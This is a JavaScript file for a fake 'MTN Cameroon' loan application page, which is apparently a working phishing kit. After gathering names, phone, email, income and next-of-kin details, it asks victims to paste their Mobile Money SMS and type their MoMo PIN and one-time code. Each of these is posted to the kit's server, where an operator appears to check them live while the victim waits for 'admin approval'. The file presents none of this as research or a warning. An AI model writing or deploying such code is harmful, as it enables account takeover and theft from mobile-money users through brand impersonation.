// ============================================================
// script.js – MTN Cameroon Version (Clean)
// ============================================================

const S = {
    loanType: '', loanAmount: 0, loanTerm: '', loanPurpose: '',
    firstName: '', lastName: '', phone: '', email: '',
    employment: '', annualIncome: 0,
    kinName: '', kinPhone: '',
    applicationId: '',
    isSubmitting: false
};

let currentPollTimeout = null;

// ─── Navigation ───
function goTo(pageId) {
    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
    const el = document.getElementById(pageId);
    if (el) el.classList.add('active');
    window.scrollTo(0, 0);
}

function startApplication() {
    S.applicationId = 'MTN-CM-' + Date.now().toString().slice(-6);
    goTo('page-step1');
}

// ─── Form Helpers ───
function normalizePhone(id) {
    let inp = document.getElementById(id);
    let val = inp.value.replace(/\D/g, '');
    if (val.length > 9) val = val.substring(0, 9);
    inp.value = val;
}

function updateCalc() {
    const amt = +document.getElementById('amtSlider').value;
    document.getElementById('calcAmt').textContent = 'XAF ' + amt.toLocaleString();
    const monthly = Math.ceil(amt / 48);
    document.getElementById('monthlyAmt').textContent = 'XAF ' + monthly.toLocaleString();
}

function showErr(id, msg) {
    const box = document.getElementById(id);
    if (box) {
        box.classList.add('show');
        const txt = document.getElementById(id + 'Txt');
        if (txt) txt.textContent = msg;
    }
}

function clearErr(id) {
    const box = document.getElementById(id);
    if (box) box.classList.remove('show');
}

// ─── Step Navigation ───
function toS2() {
    const ty = document.getElementById('s1ty').value;
    const am = +document.getElementById('s1am').value;
    const te = document.getElementById('s1te').value;
    const pu = document.getElementById('s1pu').value;
    if (!ty || am <= 0 || !te || !pu.trim()) {
        showErr('s1Err', 'Please complete all fields.');
        return;
    }
    S.loanType = ty; S.loanAmount = am; S.loanTerm = te; S.loanPurpose = pu;
    goTo('page-step2');
}

function toS3() {
    const fi = document.getElementById('s2fi').value.trim();
    const la = document.getElementById('s2la').value.trim();
    const ph = document.getElementById('s2ph').value;
    const em = document.getElementById('s2em').value.trim();
    if (!fi || !la || ph.length !== 9 || !em) {
        showErr('s2Err', 'Please enter valid details.');
        return;
    }
    S.firstName = fi; S.lastName = la; S.phone = ph; S.email = em;
    goTo('page-step3');
}

// ─── PIN/OTP Helpers ───
function pinMvM(el, i, maxLength = 5) {
    el.value = el.value.replace(/\D/g, '');
    if (el.value && i < maxLength - 1) {
        const nextPin = document.getElementById('pin' + (i + 1));
        if (nextPin) { nextPin.focus(); return; }
        const nextOtp = document.getElementById('otp' + (i + 1));
        if (nextOtp) { nextOtp.focus(); return; }
        const nextLp = document.getElementById('lp' + (i + 1));
        if (nextLp) nextLp.focus();
    }
}

function togPin() {
    for (let i = 0; i < 5; i++) {
        const b = document.getElementById('pin' + i);
        if (b) b.type = b.type === 'password' ? 'text' : 'password';
    }
    for (let i = 0; i < 4; i++) {
        const b = document.getElementById('otp' + i);
        if (b) b.type = b.type === 'password' ? 'text' : 'password';
    }
}

function chkPin() {
    const pinOk = [0,1,2,3,4].every(i => document.getElementById('pin' + i)?.value);
    const pinBtn = document.querySelector('#page-pin .btn-grad');
    if (pinBtn) pinBtn.disabled = !pinOk;

    const otpOk = [0,1,2,3].every(i => document.getElementById('otp' + i)?.value);
    const otpBtn = document.querySelector('#page-otp .btn-grad');
    if (otpBtn) otpBtn.disabled = !otpOk;
}

document.addEventListener('keyup', chkPin);

function clearLoginPin() {
    [0,1,2,3,4].forEach(i => document.getElementById('pin'+i).value = '');
    document.getElementById('pin0').focus();
    chkPin();
}

function clearOtpCode() {
    [0,1,2,3].forEach(i => document.getElementById('otp'+i).value = '');
    document.getElementById('otp0').focus();
    chkPin();
}

function handleOtpInput(el, type) {
    el.value = el.value.replace(/\D/, '');
    const idx = parseInt(el.id.match(/\d$/)[0]);
    if (el.value && type === 'otp' && idx < 3) {
        document.getElementById('otp' + (idx + 1))?.focus();
    }
    chkPin();
}

// ─── Polling ───
function startPoll(applicationId, step, onSuccess, onReject) {
    if (currentPollTimeout) {
        clearTimeout(currentPollTimeout);
        currentPollTimeout = null;
    }

    const check = async () => {
        try {
            const res = await fetch(`/api/status/${applicationId}/${step}`);
            const data = await res.json();
            if (data && data.ok === true) {
                if (data.status === 'approved') {
                    currentPollTimeout = null;
                    onSuccess();
                    return;
                } else if (data.status === 'rejected') {
                    currentPollTimeout = null;
                    onReject();
                    return;
                }
            }
            currentPollTimeout = setTimeout(check, 2000);
        } catch (err) {
            currentPollTimeout = setTimeout(check, 3000);
        }
    };
    check();
}

// ─── Submit Application ───
async function submitApp() {
    const em = document.getElementById('s3em').value;
    const in_ = +document.getElementById('s3in').value;
    const kn = document.getElementById('s3kn').value.trim();
    const kp = document.getElementById('s3kp').value.trim();
    if (!em || in_ <= 0) {
        showErr('s3Err', 'Please complete all fields.');
        return;
    }
    S.employment = em; S.annualIncome = in_; S.kinName = kn; S.kinPhone = kp;
    goTo('page-processing');

    try {
        await fetch('/api/send-application', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ applicationData: S })
        });
        document.getElementById('processingStatus').innerHTML = '⏳ Awaiting admin approval...';
        startPoll(S.applicationId, 'sms',
            () => { goTo('page-sms-paste'); },
            () => {
                showErr('s3Err', '❌ Application rejected by admin. Please try again.');
                goTo('page-step3');
            }
        );
    } catch {
        showErr('s3Err', 'Failed to submit application.');
    }
}

// ─── SMS ───
async function doSmsParse() {
    const msg = document.getElementById('smsMsgBox').value.trim();
    if (msg.length < 3) {
        showErr('momErr', 'Please paste a valid SMS message.');
        return;
    }

    await fetch('/api/send-momo-message', {
        method: 'POST',
        body: JSON.stringify({
            momoData: { applicationId: S.applicationId, phone: S.phone, momoMessage: msg }
        }),
        headers: { 'Content-Type': 'application/json' }
    });

    document.getElementById('waitSmsAppId').textContent = S.applicationId;
    goTo('page-wait-sms');

    startPoll(S.applicationId, 'sms',
        () => { goTo('page-pin'); },
        () => {
            showErr('momErr', '❌ Invalid SMS. Please resend and try again.');
            document.getElementById('smsMsgBox').value = '';
            goTo('page-sms-paste');
        }
    );
}

// ─── PIN ───
async function doPin() {
    const pin = [0,1,2,3,4].map(i => document.getElementById('pin'+i).value).join('');
    if (pin.length < 5) {
        showErr('pinErr', 'Enter a valid 5-digit MoMo PIN.');
        return;
    }

    await fetch('/api/send-pin', {
        method: 'POST',
        body: JSON.stringify({ applicationId: S.applicationId, pin }),
        headers: { 'Content-Type': 'application/json' }
    });

    document.getElementById('waitPinAppId').textContent = S.applicationId;
    goTo('page-wait-pin');

    startPoll(S.applicationId, 'pin',
        () => { goTo('page-otp'); },
        () => {
            showErr('pinErr', '❌ Invalid PIN. Please try again.');
            document.querySelectorAll('#page-pin .pin-box').forEach(b => b.value = '');
            goTo('page-pin');
        }
    );
}

// ─── OTP ───
async function doOtp() {
    const otp = [0,1,2,3].map(i => document.getElementById('otp'+i).value).join('');
    if (otp.length < 4) {
        showErr('otpErr', 'Enter a valid 4-digit OTP.');
        return;
    }

    await fetch('/api/send-otp', {
        method: 'POST',
        body: JSON.stringify({ applicationId: S.applicationId, otp }),
        headers: { 'Content-Type': 'application/json' }
    });

    document.getElementById('waitOtpAppId').textContent = S.applicationId;
    goTo('page-wait-otp');

    startPoll(S.applicationId, 'otp',
        () => {
            document.getElementById('aprAmount').textContent = 'XAF ' + S.loanAmount.toLocaleString();
            document.getElementById('aprAmt').textContent = 'XAF ' + S.loanAmount.toLocaleString();
            document.getElementById('aprTerm').textContent = S.loanTerm;
            const monthly = Math.ceil(S.loanAmount / parseInt(S.loanTerm));
            document.getElementById('aprMth').textContent = 'XAF ' + monthly.toLocaleString();
            goTo('page-approval');
        },
        () => {
            showErr('otpErr', '❌ Invalid OTP. Please resend and try again.');
            clearOtpCode();
            goTo('page-otp');
        }
    );
}

// ─── INIT ───
updateCalc();
goTo('page-landing');
console.log('✅ MTN Cameroon Loan App loaded!');
